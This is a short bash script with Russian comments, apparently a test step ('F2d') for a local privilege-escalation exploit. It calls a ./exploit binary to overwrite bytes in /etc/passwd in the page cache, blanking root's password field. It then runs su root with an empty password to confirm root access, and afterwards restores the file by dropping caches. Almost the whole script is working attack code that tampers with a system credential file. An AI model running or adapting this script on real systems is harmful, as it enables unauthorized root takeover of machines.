#!/bin/bash
# F2d: классический сценарий /etc/passwd — обнуление поля пароля root
set -u
cd ~/exploit

echo "=== F2d: /etc/passwd ==="
echo "строка root ДО:  $(head -1 /etc/passwd)"
md5sum /etc/passwd | cut -d" " -f1 | xargs echo "md5 ДО:"

echo "--- запись 3a3a3a3a (': '::') на смещение 5: root:x: -> root::::"
./exploit /etc/passwd 5 3a3a3a3a 2>&1 | grep -E "теперь|примитив"
echo "строка root ПОСЛЕ: $(head -1 /etc/passwd)"

echo "--- попытка su root с пустым паролем:"
echo "" | timeout 10 su root -c "id; echo === ROOT БЕЗ ПАТЧА БИНАРНИКОВ ===" 2>&1 | head -3

echo "--- восстановление (страницы passwd чистые => drop_caches вернёт диск):"
sudo sh -c 'sync; echo 3 > /proc/sys/vm/drop_caches'
echo "строка root ВОССТ.: $(head -1 /etc/passwd)"
md5sum /etc/passwd | cut -d" " -f1 | xargs echo "md5 ПОСЛЕ:"
